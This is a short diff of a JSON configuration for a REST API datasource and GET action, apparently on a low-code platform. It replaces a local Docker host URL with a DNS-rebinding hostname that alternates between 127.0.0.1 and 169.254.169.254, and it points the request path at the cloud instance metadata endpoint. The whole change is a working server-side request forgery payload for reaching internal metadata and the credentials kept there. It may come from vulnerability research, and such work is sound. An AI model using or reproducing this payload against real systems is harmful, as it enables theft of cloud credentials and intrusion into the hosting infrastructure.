@@ -7,8 +7,7 @@
       "name": "DEFAULT_REST_DATASOURCE",
       "pluginId": "restapi-plugin",
       "datasourceConfiguration": {
-        "sshProxyEnabled": false,
-        "url": "http://host.docker.internal"
+        "url": "http://A.127.0.0.1.1time.169.254.169.254.1time.repeat.8f058b8.rebind.network"
       },
       "invalids": [],
       "messages": [],
@@ -21,7 +20,7 @@
     "actionConfiguration": {
       "timeoutInMillisecond": 10000,
       "paginationType": "NONE",
-      "path": "",
+      "path": "/2021-07-15/meta-data",
       "headers": [
         {
           "key": "po",
@@ -29,12 +28,7 @@
         }
       ],
       "encodeParamsToggle": true,
-      "queryParameters": [
-        {
-          "key": "param",
-          "value": ""
-        }
-      ],
+      "queryParameters": [],
       "body": "",
       "httpMethod": "GET",
       "pluginSpecifiedTemplates": [
